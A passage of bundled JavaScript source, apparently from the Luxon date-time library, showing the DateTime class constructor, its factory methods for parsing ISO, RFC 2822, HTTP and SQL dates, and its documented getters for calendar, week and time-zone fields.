        return end2.startOf(unit).diff(start2.startOf(unit), unit).get(unit);
      } else return 0;
    } else {
      return end2.diff(start2, unit).get(unit);
    }
  };
  if (opts.unit) {
    return format(differ(opts.unit), opts.unit);
  }
  for (const unit of opts.units) {
    const count = differ(unit);
    if (Math.abs(count) >= 1) {
      return format(count, unit);
    }
  }
  return format(start2 > end2 ? -0 : 0, opts.units[opts.units.length - 1]);
}
function lastOpts(argList) {
  let opts = {}, args;
  if (argList.length > 0 && typeof argList[argList.length - 1] === "object") {
    opts = argList[argList.length - 1];
    args = Array.from(argList).slice(0, argList.length - 1);
  } else {
    args = Array.from(argList);
  }
  return [opts, args];
}
let zoneOffsetTs;
let zoneOffsetGuessCache = {};
class DateTime {
  /**
   * @access private
   */
  constructor(config) {
    const zone = config.zone || Settings.defaultZone;
    let invalid = config.invalid || (Number.isNaN(config.ts) ? new Invalid("invalid input") : null) || (!zone.isValid ? unsupportedZone(zone) : null);
    this.ts = isUndefined(config.ts) ? Settings.now() : config.ts;
    let c = null, o = null;
    if (!invalid) {
      const unchanged = config.old && config.old.ts === this.ts && config.old.zone.equals(zone);
      if (unchanged) {
        [c, o] = [config.old.c, config.old.o];
      } else {
        const ot = isNumber(config.o) && !config.old ? config.o : zone.offset(this.ts);
        c = tsToObj(this.ts, ot);
        invalid = Number.isNaN(c.year) ? new Invalid("invalid input") : null;
        c = invalid ? null : c;
        o = invalid ? null : ot;
      }
    }
    this._zone = zone;
    this.loc = config.loc || Locale.create();
    this.invalid = invalid;
    this.weekData = null;
    this.localWeekData = null;
    this.c = c;
    this.o = o;
    this.isLuxonDateTime = true;
  }
  // CONSTRUCT
  /**
   * Create a DateTime for the current instant, in the system's time zone.
   *
   * Use Settings to override these default values if needed.
   * @example DateTime.now().toISO() //~> now in the ISO format
   * @return {DateTime}
   */
  static now() {
    return new DateTime({});
  }
  /**
   * Create a local DateTime
   * @param {number} [year] - The calendar year. If omitted (as in, call `local()` with no arguments), the current time will be used
   * @param {number} [month=1] - The month, 1-indexed
   * @param {number} [day=1] - The day of the month, 1-indexed
   * @param {number} [hour=0] - The hour of the day, in 24-hour time
   * @param {number} [minute=0] - The minute of the hour, meaning a number between 0 and 59
   * @param {number} [second=0] - The second of the minute, meaning a number between 0 and 59
   * @param {number} [millisecond=0] - The millisecond of the second, meaning a number between 0 and 999
   * @example DateTime.local()                                  //~> now
   * @example DateTime.local({ zone: "America/New_York" })      //~> now, in US east coast time
   * @example DateTime.local(2017)                              //~> 2017-01-01T00:00:00
   * @example DateTime.local(2017, 3)                           //~> 2017-03-01T00:00:00
   * @example DateTime.local(2017, 3, 12, { locale: "fr" })     //~> 2017-03-12T00:00:00, with a French locale
   * @example DateTime.local(2017, 3, 12, 5)                    //~> 2017-03-12T05:00:00
   * @example DateTime.local(2017, 3, 12, 5, { zone: "utc" })   //~> 2017-03-12T05:00:00, in UTC
   * @example DateTime.local(2017, 3, 12, 5, 45)                //~> 2017-03-12T05:45:00
   * @example DateTime.local(2017, 3, 12, 5, 45, 10)            //~> 2017-03-12T05:45:10
   * @example DateTime.local(2017, 3, 12, 5, 45, 10, 765)       //~> 2017-03-12T05:45:10.765
   * @return {DateTime}
   */
  static local() {
    const [opts, args] = lastOpts(arguments), [year, month, day, hour, minute, second, millisecond] = args;
    return quickDT({ year, month, day, hour, minute, second, millisecond }, opts);
  }
  /**
   * Create a DateTime in UTC
   * @param {number} [year] - The calendar year. If omitted (as in, call `utc()` with no arguments), the current time will be used
   * @param {number} [month=1] - The month, 1-indexed
   * @param {number} [day=1] - The day of the month
   * @param {number} [hour=0] - The hour of the day, in 24-hour time
   * @param {number} [minute=0] - The minute of the hour, meaning a number between 0 and 59
   * @param {number} [second=0] - The second of the minute, meaning a number between 0 and 59
   * @param {number} [millisecond=0] - The millisecond of the second, meaning a number between 0 and 999
   * @param {Object} options - configuration options for the DateTime
   * @param {string} [options.locale] - a locale to set on the resulting DateTime instance
   * @param {string} [options.outputCalendar] - the output calendar to set on the resulting DateTime instance
   * @param {string} [options.numberingSystem] - the numbering system to set on the resulting DateTime instance
   * @param {string} [options.weekSettings] - the week settings to set on the resulting DateTime instance
   * @example DateTime.utc()                                              //~> now
   * @example DateTime.utc(2017)                                          //~> 2017-01-01T00:00:00Z
   * @example DateTime.utc(2017, 3)                                       //~> 2017-03-01T00:00:00Z
   * @example DateTime.utc(2017, 3, 12)                                   //~> 2017-03-12T00:00:00Z
   * @example DateTime.utc(2017, 3, 12, 5)                                //~> 2017-03-12T05:00:00Z
   * @example DateTime.utc(2017, 3, 12, 5, 45)                            //~> 2017-03-12T05:45:00Z
   * @example DateTime.utc(2017, 3, 12, 5, 45, { locale: "fr" })          //~> 2017-03-12T05:45:00Z with a French locale
   * @example DateTime.utc(2017, 3, 12, 5, 45, 10)                        //~> 2017-03-12T05:45:10Z
   * @example DateTime.utc(2017, 3, 12, 5, 45, 10, 765, { locale: "fr" }) //~> 2017-03-12T05:45:10.765Z with a French locale
   * @return {DateTime}
   */
  static utc() {
    const [opts, args] = lastOpts(arguments), [year, month, day, hour, minute, second, millisecond] = args;
    opts.zone = FixedOffsetZone.utcInstance;
    return quickDT({ year, month, day, hour, minute, second, millisecond }, opts);
  }
  /**
   * Create a DateTime from a JavaScript Date object. Uses the default zone.
   * @param {Date} date - a JavaScript Date object
   * @param {Object} options - configuration options for the DateTime
   * @param {string|Zone} [options.zone='local'] - the zone to place the DateTime into
   * @return {DateTime}
   */
  static fromJSDate(date2, options = {}) {
    const ts = isDate(date2) ? date2.valueOf() : NaN;
    if (Number.isNaN(ts)) {
      return DateTime.invalid("invalid input");
    }
    const zoneToUse = normalizeZone(options.zone, Settings.defaultZone);
    if (!zoneToUse.isValid) {
      return DateTime.invalid(unsupportedZone(zoneToUse));
    }
    return new DateTime({
      ts,
      zone: zoneToUse,
      loc: Locale.fromObject(options)
    });
  }
  /**
   * Create a DateTime from a number of milliseconds since the epoch (meaning since 1 January 1970 00:00:00 UTC). Uses the default zone.
   * @param {number} milliseconds - a number of milliseconds since 1970 UTC
   * @param {Object} options - configuration options for the DateTime
   * @param {string|Zone} [options.zone='local'] - the zone to place the DateTime into
   * @param {string} [options.locale] - a locale to set on the resulting DateTime instance
   * @param {string} options.outputCalendar - the output calendar to set on the resulting DateTime instance
   * @param {string} options.numberingSystem - the numbering system to set on the resulting DateTime instance
   * @param {string} options.weekSettings - the week settings to set on the resulting DateTime instance
   * @return {DateTime}
   */
  static fromMillis(milliseconds, options = {}) {
    if (!isNumber(milliseconds)) {
      throw new InvalidArgumentError(
        `fromMillis requires a numerical input, but received a ${typeof milliseconds} with value ${milliseconds}`
      );
    } else if (milliseconds < -MAX_DATE || milliseconds > MAX_DATE) {
      return DateTime.invalid("Timestamp out of range");
    } else {
      return new DateTime({
        ts: milliseconds,
        zone: normalizeZone(options.zone, Settings.defaultZone),
        loc: Locale.fromObject(options)
      });
    }
  }
  /**
   * Create a DateTime from a number of seconds since the epoch (meaning since 1 January 1970 00:00:00 UTC). Uses the default zone.
   * @param {number} seconds - a number of seconds since 1970 UTC
   * @param {Object} options - configuration options for the DateTime
   * @param {string|Zone} [options.zone='local'] - the zone to place the DateTime into
   * @param {string} [options.locale] - a locale to set on the resulting DateTime instance
   * @param {string} options.outputCalendar - the output calendar to set on the resulting DateTime instance
   * @param {string} options.numberingSystem - the numbering system to set on the resulting DateTime instance
   * @param {string} options.weekSettings - the week settings to set on the resulting DateTime instance
   * @return {DateTime}
   */
  static fromSeconds(seconds, options = {}) {
    if (!isNumber(seconds)) {
      throw new InvalidArgumentError("fromSeconds requires a numerical input");
    } else {
      return new DateTime({
        ts: seconds * 1e3,
        zone: normalizeZone(options.zone, Settings.defaultZone),
        loc: Locale.fromObject(options)
      });
    }
  }
  /**
   * Create a DateTime from a JavaScript object with keys like 'year' and 'hour' with reasonable defaults.
   * @param {Object} obj - the object to create the DateTime from
   * @param {number} obj.year - a year, such as 1987
   * @param {number} obj.month - a month, 1-12
   * @param {number} obj.day - a day of the month, 1-31, depending on the month
   * @param {number} obj.ordinal - day of the year, 1-365 or 366
   * @param {number} obj.weekYear - an ISO week year
   * @param {number} obj.weekNumber - an ISO week number, between 1 and 52 or 53, depending on the year
   * @param {number} obj.weekday - an ISO weekday, 1-7, where 1 is Monday and 7 is Sunday
   * @param {number} obj.localWeekYear - a week year, according to the locale
   * @param {number} obj.localWeekNumber - a week number, between 1 and 52 or 53, depending on the year, according to the locale
   * @param {number} obj.localWeekday - a weekday, 1-7, where 1 is the first and 7 is the last day of the week, according to the locale
   * @param {number} obj.hour - hour of the day, 0-23
   * @param {number} obj.minute - minute of the hour, 0-59
   * @param {number} obj.second - second of the minute, 0-59
   * @param {number} obj.millisecond - millisecond of the second, 0-999
   * @param {Object} opts - options for creating this DateTime
   * @param {string|Zone} [opts.zone='local'] - interpret the numbers in the context of a particular zone. Can take any value taken as the first argument to setZone()
   * @param {string} [opts.locale='system\'s locale'] - a locale to set on the resulting DateTime instance
   * @param {string} opts.outputCalendar - the output calendar to set on the resulting DateTime instance
   * @param {string} opts.numberingSystem - the numbering system to set on the resulting DateTime instance
   * @param {string} opts.weekSettings - the week settings to set on the resulting DateTime instance
   * @example DateTime.fromObject({ year: 1982, month: 5, day: 25}).toISODate() //=> '1982-05-25'
   * @example DateTime.fromObject({ year: 1982 }).toISODate() //=> '1982-01-01'
   * @example DateTime.fromObject({ hour: 10, minute: 26, second: 6 }) //~> today at 10:26:06
   * @example DateTime.fromObject({ hour: 10, minute: 26, second: 6 }, { zone: 'utc' }),
   * @example DateTime.fromObject({ hour: 10, minute: 26, second: 6 }, { zone: 'local' })
   * @example DateTime.fromObject({ hour: 10, minute: 26, second: 6 }, { zone: 'America/New_York' })
   * @example DateTime.fromObject({ weekYear: 2016, weekNumber: 2, weekday: 3 }).toISODate() //=> '2016-01-13'
   * @example DateTime.fromObject({ localWeekYear: 2022, localWeekNumber: 1, localWeekday: 1 }, { locale: "en-US" }).toISODate() //=> '2021-12-26'
   * @return {DateTime}
   */
  static fromObject(obj, opts = {}) {
    obj = obj || {};
    const zoneToUse = normalizeZone(opts.zone, Settings.defaultZone);
    if (!zoneToUse.isValid) {
      return DateTime.invalid(unsupportedZone(zoneToUse));
    }
    const loc = Locale.fromObject(opts);
    const normalized = normalizeObject(obj, normalizeUnitWithLocalWeeks);
    const { minDaysInFirstWeek, startOfWeek } = usesLocalWeekValues(normalized, loc);
    const tsNow = Settings.now(), offsetProvis = !isUndefined(opts.specificOffset) ? opts.specificOffset : zoneToUse.offset(tsNow), containsOrdinal = !isUndefined(normalized.ordinal), containsGregorYear = !isUndefined(normalized.year), containsGregorMD = !isUndefined(normalized.month) || !isUndefined(normalized.day), containsGregor = containsGregorYear || containsGregorMD, definiteWeekDef = normalized.weekYear || normalized.weekNumber;
    if ((containsGregor || containsOrdinal) && definiteWeekDef) {
      throw new ConflictingSpecificationError(
        "Can't mix weekYear/weekNumber units with year/month/day or ordinals"
      );
    }
    if (containsGregorMD && containsOrdinal) {
      throw new ConflictingSpecificationError("Can't mix ordinal dates with month/day");
    }
    const useWeekData = definiteWeekDef || normalized.weekday && !containsGregor;
    let units, defaultValues, objNow = tsToObj(tsNow, offsetProvis);
    if (useWeekData) {
      units = orderedWeekUnits;
      defaultValues = defaultWeekUnitValues;
      objNow = gregorianToWeek(objNow, minDaysInFirstWeek, startOfWeek);
    } else if (containsOrdinal) {
      units = orderedOrdinalUnits;
      defaultValues = defaultOrdinalUnitValues;
      objNow = gregorianToOrdinal(objNow);
    } else {
      units = orderedUnits;
      defaultValues = defaultUnitValues;
    }
    let foundFirst = false;
    for (const u of units) {
      const v = normalized[u];
      if (!isUndefined(v)) {
        foundFirst = true;
      } else if (foundFirst) {
        normalized[u] = defaultValues[u];
      } else {
        normalized[u] = objNow[u];
      }
    }
    const higherOrderInvalid = useWeekData ? hasInvalidWeekData(normalized, minDaysInFirstWeek, startOfWeek) : containsOrdinal ? hasInvalidOrdinalData(normalized) : hasInvalidGregorianData(normalized), invalid = higherOrderInvalid || hasInvalidTimeData(normalized);
    if (invalid) {
      return DateTime.invalid(invalid);
    }
    const gregorian = useWeekData ? weekToGregorian(normalized, minDaysInFirstWeek, startOfWeek) : containsOrdinal ? ordinalToGregorian(normalized) : normalized, [tsFinal, offsetFinal] = objToTS(gregorian, offsetProvis, zoneToUse), inst = new DateTime({
      ts: tsFinal,
      zone: zoneToUse,
      o: offsetFinal,
      loc
    });
    if (normalized.weekday && containsGregor && obj.weekday !== inst.weekday) {
      return DateTime.invalid(
        "mismatched weekday",
        `you can't specify both a weekday of ${normalized.weekday} and a date of ${inst.toISO()}`
      );
    }
    if (!inst.isValid) {
      return DateTime.invalid(inst.invalid);
    }
    return inst;
  }
  /**
   * Create a DateTime from an ISO 8601 string
   * @param {string} text - the ISO string
   * @param {Object} opts - options to affect the creation
   * @param {string|Zone} [opts.zone='local'] - use this zone if no offset is specified in the input string itself. Will also convert the time to this zone
   * @param {boolean} [opts.setZone=false] - override the zone with a fixed-offset zone specified in the string itself, if it specifies one
   * @param {string} [opts.locale='system's locale'] - a locale to set on the resulting DateTime instance
   * @param {string} [opts.outputCalendar] - the output calendar to set on the resulting DateTime instance
   * @param {string} [opts.numberingSystem] - the numbering system to set on the resulting DateTime instance
   * @param {string} [opts.weekSettings] - the week settings to set on the resulting DateTime instance
   * @example DateTime.fromISO('2016-05-25T09:08:34.123')
   * @example DateTime.fromISO('2016-05-25T09:08:34.123+06:00')
   * @example DateTime.fromISO('2016-05-25T09:08:34.123+06:00', {setZone: true})
   * @example DateTime.fromISO('2016-05-25T09:08:34.123', {zone: 'utc'})
   * @example DateTime.fromISO('2016-W05-4')
   * @return {DateTime}
   */
  static fromISO(text, opts = {}) {
    const [vals, parsedZone] = parseISODate(text);
    return parseDataToDateTime(vals, parsedZone, opts, "ISO 8601", text);
  }
  /**
   * Create a DateTime from an RFC 2822 string
   * @param {string} text - the RFC 2822 string
   * @param {Object} opts - options to affect the creation
   * @param {string|Zone} [opts.zone='local'] - convert the time to this zone. Since the offset is always specified in the string itself, this has no effect on the interpretation of string, merely the zone the resulting DateTime is expressed in.
   * @param {boolean} [opts.setZone=false] - override the zone with a fixed-offset zone specified in the string itself, if it specifies one
   * @param {string} [opts.locale='system's locale'] - a locale to set on the resulting DateTime instance
   * @param {string} opts.outputCalendar - the output calendar to set on the resulting DateTime instance
   * @param {string} opts.numberingSystem - the numbering system to set on the resulting DateTime instance
   * @param {string} opts.weekSettings - the week settings to set on the resulting DateTime instance
   * @example DateTime.fromRFC2822('25 Nov 2016 13:23:12 GMT')
   * @example DateTime.fromRFC2822('Fri, 25 Nov 2016 13:23:12 +0600')
   * @example DateTime.fromRFC2822('25 Nov 2016 13:23 Z')
   * @return {DateTime}
   */
  static fromRFC2822(text, opts = {}) {
    const [vals, parsedZone] = parseRFC2822Date(text);
    return parseDataToDateTime(vals, parsedZone, opts, "RFC 2822", text);
  }
  /**
   * Create a DateTime from an HTTP header date
   * @see https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.3.1
   * @param {string} text - the HTTP header date
   * @param {Object} opts - options to affect the creation
   * @param {string|Zone} [opts.zone='local'] - convert the time to this zone. Since HTTP dates are always in UTC, this has no effect on the interpretation of string, merely the zone the resulting DateTime is expressed in.
   * @param {boolean} [opts.setZone=false] - override the zone with the fixed-offset zone specified in the string. For HTTP dates, this is always UTC, so this option is equivalent to setting the `zone` option to 'utc', but this option is included for consistency with similar methods.
   * @param {string} [opts.locale='system's locale'] - a locale to set on the resulting DateTime instance
   * @param {string} opts.outputCalendar - the output calendar to set on the resulting DateTime instance
   * @param {string} opts.numberingSystem - the numbering system to set on the resulting DateTime instance
   * @param {string} opts.weekSettings - the week settings to set on the resulting DateTime instance
   * @example DateTime.fromHTTP('Sun, 06 Nov 1994 08:49:37 GMT')
   * @example DateTime.fromHTTP('Sunday, 06-Nov-94 08:49:37 GMT')
   * @example DateTime.fromHTTP('Sun Nov  6 08:49:37 1994')
   * @return {DateTime}
   */
  static fromHTTP(text, opts = {}) {
    const [vals, parsedZone] = parseHTTPDate(text);
    return parseDataToDateTime(vals, parsedZone, opts, "HTTP", opts);
  }
  /**
   * Create a DateTime from an input string and format string.
   * Defaults to en-US if no locale has been specified, regardless of the system's locale. For a table of tokens and their interpretations, see [here](https://moment.github.io/luxon/#/parsing?id=table-of-tokens).
   * @param {string} text - the string to parse
   * @param {string} fmt - the format the string is expected to be in (see the link below for the formats)
   * @param {Object} opts - options to affect the creation
   * @param {string|Zone} [opts.zone='local'] - use this zone if no offset is specified in the input string itself. Will also convert the DateTime to this zone
   * @param {boolean} [opts.setZone=false] - override the zone with a zone specified in the string itself, if it specifies one
   * @param {string} [opts.locale='en-US'] - a locale string to use when parsing. Will also set the DateTime to this locale
   * @param {string} opts.numberingSystem - the numbering system to use when parsing. Will also set the resulting DateTime to this numbering system
   * @param {string} opts.weekSettings - the week settings to set on the resulting DateTime instance
   * @param {string} opts.outputCalendar - the output calendar to set on the resulting DateTime instance
   * @return {DateTime}
   */
  static fromFormat(text, fmt, opts = {}) {
    if (isUndefined(text) || isUndefined(fmt)) {
      throw new InvalidArgumentError("fromFormat requires an input string and a format");
    }
    const { locale = null, numberingSystem = null } = opts, localeToUse = Locale.fromOpts({
      locale,
      numberingSystem,
      defaultToEN: true
    }), [vals, parsedZone, specificOffset, invalid] = parseFromTokens(localeToUse, text, fmt);
    if (invalid) {
      return DateTime.invalid(invalid);
    } else {
      return parseDataToDateTime(vals, parsedZone, opts, `format ${fmt}`, text, specificOffset);
    }
  }
  /**
   * @deprecated use fromFormat instead
   */
  static fromString(text, fmt, opts = {}) {
    return DateTime.fromFormat(text, fmt, opts);
  }
  /**
   * Create a DateTime from a SQL date, time, or datetime
   * Defaults to en-US if no locale has been specified, regardless of the system's locale
   * @param {string} text - the string to parse
   * @param {Object} opts - options to affect the creation
   * @param {string|Zone} [opts.zone='local'] - use this zone if no offset is specified in the input string itself. Will also convert the DateTime to this zone
   * @param {boolean} [opts.setZone=false] - override the zone with a zone specified in the string itself, if it specifies one
   * @param {string} [opts.locale='en-US'] - a locale string to use when parsing. Will also set the DateTime to this locale
   * @param {string} opts.numberingSystem - the numbering system to use when parsing. Will also set the resulting DateTime to this numbering system
   * @param {string} opts.weekSettings - the week settings to set on the resulting DateTime instance
   * @param {string} opts.outputCalendar - the output calendar to set on the resulting DateTime instance
   * @example DateTime.fromSQL('2017-05-15')
   * @example DateTime.fromSQL('2017-05-15 09:12:34')
   * @example DateTime.fromSQL('2017-05-15 09:12:34.342')
   * @example DateTime.fromSQL('2017-05-15 09:12:34.342+06:00')
   * @example DateTime.fromSQL('2017-05-15 09:12:34.342 America/Los_Angeles')
   * @example DateTime.fromSQL('2017-05-15 09:12:34.342 America/Los_Angeles', { setZone: true })
   * @example DateTime.fromSQL('2017-05-15 09:12:34.342', { zone: 'America/Los_Angeles' })
   * @example DateTime.fromSQL('09:12:34.342')
   * @return {DateTime}
   */
  static fromSQL(text, opts = {}) {
    const [vals, parsedZone] = parseSQL(text);
    return parseDataToDateTime(vals, parsedZone, opts, "SQL", text);
  }
  /**
   * Create an invalid DateTime.
   * @param {string} reason - simple string of why this DateTime is invalid. Should not contain parameters or anything else data-dependent.
   * @param {string} [explanation=null] - longer explanation, may include parameters and other useful debugging information
   * @return {DateTime}
   */
  static invalid(reason, explanation = null) {
    if (!reason) {
      throw new InvalidArgumentError("need to specify a reason the DateTime is invalid");
    }
    const invalid = reason instanceof Invalid ? reason : new Invalid(reason, explanation);
    if (Settings.throwOnInvalid) {
      throw new InvalidDateTimeError(invalid);
    } else {
      return new DateTime({ invalid });
    }
  }
  /**
   * Check if an object is an instance of DateTime. Works across context boundaries
   * @param {object} o
   * @return {boolean}
   */
  static isDateTime(o) {
    return o && o.isLuxonDateTime || false;
  }
  /**
   * Produce the format string for a set of options
   * @param formatOpts
   * @param localeOpts
   * @returns {string}
   */
  static parseFormatForOpts(formatOpts, localeOpts = {}) {
    const tokenList = formatOptsToTokens(formatOpts, Locale.fromObject(localeOpts));
    return !tokenList ? null : tokenList.map((t) => t ? t.val : null).join("");
  }
  /**
   * Produce the the fully expanded format token for the locale
   * Does NOT quote characters, so quoted tokens will not round trip correctly
   * @param fmt
   * @param localeOpts
   * @returns {string}
   */
  static expandFormat(fmt, localeOpts = {}) {
    const expanded = expandMacroTokens(Formatter.parseFormat(fmt), Locale.fromObject(localeOpts));
    return expanded.map((t) => t.val).join("");
  }
  static resetCache() {
    zoneOffsetTs = void 0;
    zoneOffsetGuessCache = {};
  }
  // INFO
  /**
   * Get the value of unit.
   * @param {string} unit - a unit such as 'minute' or 'day'
   * @example DateTime.local(2017, 7, 4).get('month'); //=> 7
   * @example DateTime.local(2017, 7, 4).get('day'); //=> 4
   * @return {number}
   */
  get(unit) {
    return this[unit];
  }
  /**
   * Returns whether the DateTime is valid. Invalid DateTimes occur when:
   * * The DateTime was created from invalid calendar information, such as the 13th month or February 30
   * * The DateTime was created by an operation on another invalid date
   * @type {boolean}
   */
  get isValid() {
    return this.invalid === null;
  }
  /**
   * Returns an error code if this DateTime is invalid, or null if the DateTime is valid
   * @type {string}
   */
  get invalidReason() {
    return this.invalid ? this.invalid.reason : null;
  }
  /**
   * Returns an explanation of why this DateTime became invalid, or null if the DateTime is valid
   * @type {string}
   */
  get invalidExplanation() {
    return this.invalid ? this.invalid.explanation : null;
  }
  /**
   * Get the locale of a DateTime, such 'en-GB'. The locale is used when formatting the DateTime
   *
   * @type {string}
   */
  get locale() {
    return this.isValid ? this.loc.locale : null;
  }
  /**
   * Get the numbering system of a DateTime, such 'beng'. The numbering system is used when formatting the DateTime
   *
   * @type {string}
   */
  get numberingSystem() {
    return this.isValid ? this.loc.numberingSystem : null;
  }
  /**
   * Get the output calendar of a DateTime, such 'islamic'. The output calendar is used when formatting the DateTime
   *
   * @type {string}
   */
  get outputCalendar() {
    return this.isValid ? this.loc.outputCalendar : null;
  }
  /**
   * Get the time zone associated with this DateTime.
   * @type {Zone}
   */
  get zone() {
    return this._zone;
  }
  /**
   * Get the name of the time zone.
   * @type {string}
   */
  get zoneName() {
    return this.isValid ? this.zone.name : null;
  }
  /**
   * Get the year
   * @example DateTime.local(2017, 5, 25).year //=> 2017
   * @type {number}
   */
  get year() {
    return this.isValid ? this.c.year : NaN;
  }
  /**
   * Get the quarter
   * @example DateTime.local(2017, 5, 25).quarter //=> 2
   * @type {number}
   */
  get quarter() {
    return this.isValid ? Math.ceil(this.c.month / 3) : NaN;
  }
  /**
   * Get the month (1-12).
   * @example DateTime.local(2017, 5, 25).month //=> 5
   * @type {number}
   */
  get month() {
    return this.isValid ? this.c.month : NaN;
  }
  /**
   * Get the day of the month (1-30ish).
   * @example DateTime.local(2017, 5, 25).day //=> 25
   * @type {number}
   */
  get day() {
    return this.isValid ? this.c.day : NaN;
  }
  /**
   * Get the hour of the day (0-23).
   * @example DateTime.local(2017, 5, 25, 9).hour //=> 9
   * @type {number}
   */
  get hour() {
    return this.isValid ? this.c.hour : NaN;
  }
  /**
   * Get the minute of the hour (0-59).
   * @example DateTime.local(2017, 5, 25, 9, 30).minute //=> 30
   * @type {number}
   */
  get minute() {
    return this.isValid ? this.c.minute : NaN;
  }
  /**
   * Get the second of the minute (0-59).
   * @example DateTime.local(2017, 5, 25, 9, 30, 52).second //=> 52
   * @type {number}
   */
  get second() {
    return this.isValid ? this.c.second : NaN;
  }
  /**
   * Get the millisecond of the second (0-999).
   * @example DateTime.local(2017, 5, 25, 9, 30, 52, 654).millisecond //=> 654
   * @type {number}
   */
  get millisecond() {
    return this.isValid ? this.c.millisecond : NaN;
  }
  /**
   * Get the week year
   * @see https://en.wikipedia.org/wiki/ISO_week_date
   * @example DateTime.local(2014, 12, 31).weekYear //=> 2015
   * @type {number}
   */
  get weekYear() {
    return this.isValid ? possiblyCachedWeekData(this).weekYear : NaN;
  }
  /**
   * Get the week number of the week year (1-52ish).
   * @see https://en.wikipedia.org/wiki/ISO_week_date
   * @example DateTime.local(2017, 5, 25).weekNumber //=> 21
   * @type {number}
   */
  get weekNumber() {
    return this.isValid ? possiblyCachedWeekData(this).weekNumber : NaN;
  }
  /**
   * Get the day of the week.
   * 1 is Monday and 7 is Sunday
   * @see https://en.wikipedia.org/wiki/ISO_week_date
   * @example DateTime.local(2014, 11, 31).weekday //=> 4
   * @type {number}
   */
  get weekday() {
    return this.isValid ? possiblyCachedWeekData(this).weekday : NaN;
  }
  /**
   * Returns true if this date is on a weekend according to the locale, false otherwise
   * @returns {boolean}
   */
  get isWeekend() {
    return this.isValid && this.loc.getWeekendDays().includes(this.weekday);
  }
  /**
   * Get the day of the week according to the locale.
   * 1 is the first day of the week and 7 is the last day of the week.
   * If the locale assigns Sunday as the first day of the week, then a date which is a Sunday will return 1,
   * @returns {number}
   */
  get localWeekday() {
    return this.isValid ? possiblyCachedLocalWeekData(this).weekday : NaN;
  }
  /**
   * Get the week number of the week year according to the locale. Different locales assign week numbers differently,
   * because the week can start on different days of the week (see localWeekday) and because a different number of days
   * is required for a week to count as the first week of a year.
   * @returns {number}
   */
  get localWeekNumber() {
    return this.isValid ? possiblyCachedLocalWeekData(this).weekNumber : NaN;
  }
  /**
   * Get the week year according to the locale. Different locales assign week numbers (and therefor week years)
   * differently, see localWeekNumber.
   * @returns {number}
   */
  get localWeekYear() {
    return this.isValid ? possiblyCachedLocalWeekData(this).weekYear : NaN;
  }
  /**
   * Get the ordinal (meaning the day of the year)
   * @example DateTime.local(2017, 5, 25).ordinal //=> 145
   * @type {number|DateTime}
   */
  get ordinal() {
    return this.isValid ? gregorianToOrdinal(this.c).ordinal : NaN;
  }
  /**
   * Get the human readable short month name, such as 'Oct'.
   * Defaults to the system's locale if no locale has been specified
   * @example DateTime.local(2017, 10, 30).monthShort //=> Oct
   * @type {string}
   */
  get monthShort() {
    return this.isValid ? Info.months("short", { locObj: this.loc })[this.month - 1] : null;
  }
  /**
   * Get the human readable long month name, such as 'October'.
   * Defaults to the system's locale if no locale has been specified
   * @example DateTime.local(2017, 10, 30).monthLong //=> October
   * @type {string}
   */
  get monthLong() {
    return this.isValid ? Info.months("long", { locObj: this.loc })[this.month - 1] : null;
  }
  /**
   * Get the human readable short weekday, such as 'Mon'.
   * Defaults to the system's locale if no locale has been specified
   * @example DateTime.local(2017, 10, 30).weekdayShort //=> Mon
   * @type {string}
   */
  get weekdayShort() {
    return this.isValid ? Info.weekdays("short", { locObj: this.loc })[this.weekday - 1] : null;
  }
  /**
   * Get the human readable long weekday, such as 'Monday'.
   * Defaults to the system's locale if no locale has been specified
   * @example DateTime.local(2017, 10, 30).weekdayLong //=> Monday
   * @type {string}
   */
  get weekdayLong() {
    return this.isValid ? Info.weekdays("long", { locObj: this.loc })[this.weekday - 1] : null;
  }
  /**
   * Get the UTC offset of this DateTime in minutes
   * @example DateTime.now().offset //=> -240
   * @example DateTime.utc().offset //=> 0
   * @type {number}
   */
  get offset() {
    return this.isValid ? +this.o : NaN;
  }
  /**
   * Get the short human name for the zone's current offset, for example "EST" or "EDT".
   * Defaults to the system's locale if no locale has been specified
   * @type {string}
   */
  get offsetNameShort() {
    if (this.isValid) {
      return this.zone.offsetName(this.ts, {
        format: "short",
        locale: this.locale
      });
    } else {
      return null;
    }
  }
  /**
   * Get the long human name for the zone's current offset, for example "Eastern Standard Time" or "Eastern Daylight Time".
   * Defaults to the system's locale if no locale has been specified
   * @type {string}
   */
  get offsetNameLong() {
    if (this.isValid) {
      return this.zone.offsetName(this.ts, {
        format: "long",
        locale: this.locale
      });
    } else {
      return null;
    }
  }
  /**
   * Get whether this zone's offset ever changes, as in a DST.
   * @type {boolean}
   */
  get isOffsetFixed() {
    return this.isValid ? this.zone.isUniversal : null;
  }
  /**
   * Get whether the DateTime is in a DST.
   * @type {boolean}
   */
  get isInDST() {
    if (this.isOffsetFixed) {
      return false;
    } else {
      return this.offset > this.set({ month: 1, day: 1 }).offset || this.offset > this.set({ month: 5 }).offset;
    }
  }
  /**
   * Get those DateTimes which have the same local time as this DateTime, but a different offset from UTC
   * in this DateTime's zone. During DST changes local time can be ambiguous, for example
   * `2023-10-29T02:30:00` in `Europe/Berlin` can have offset `+01:00` or `+02:00`.
   * This method will return both possible DateTimes if this DateTime's local time is ambiguous.
   * @returns {DateTime[]}
   */
  getPossibleOffsets() {
    if (!this.isValid || this.isOffsetFixed) {
      return [this];
    }
    const dayMs = 864e5;
    const minuteMs = 6e4;
    const localTS = objToLocalTS(this.c);
    const oEarlier = this.zone.offset(localTS - dayMs);
    const oLater = this.zone.offset(localTS + dayMs);
    const o1 = this.zone.offset(localTS - oEarlier * minuteMs);
    const o2 = this.zone.offset(localTS - oLater * minuteMs);
    if (o1 === o2) {
      return [this];
    }
    const ts1 = localTS - o1 * minuteMs;
    const ts2 = localTS - o2 * minuteMs;
    const c1 = tsToObj(ts1, o1);
    const c2 = tsToObj(ts2, o2);
    if (c1.hour === c2.hour && c1.minute === c2.minute && c1.second === c2.second && c1.millisecond === c2.millisecond) {
      return [clone(this, { ts: ts1 }), clone(this, { ts: ts2 })];
    }
    return [this];
  }
  /**
   * Returns true if this DateTime is in a leap year, false otherwise
   * @example DateTime.local(2016).isInLeapYear //=> true
   * @example DateTime.local(2013).isInLeapYear //=> false
   * @type {boolean}
   */
  get isInLeapYear() {
    return isLeapYear(this.year);
  }
  /**
   * Returns the number of days in this DateTime's month
   * @example DateTime.local(2016, 2).daysInMonth //=> 29
   * @example DateTime.local(2016, 3).daysInMonth //=> 31
   * @type {number}
   */
  get daysInMonth() {
    return daysInMonth(this.year, this.month);
  }
  /**
   * Returns the number of days in this DateTime's year
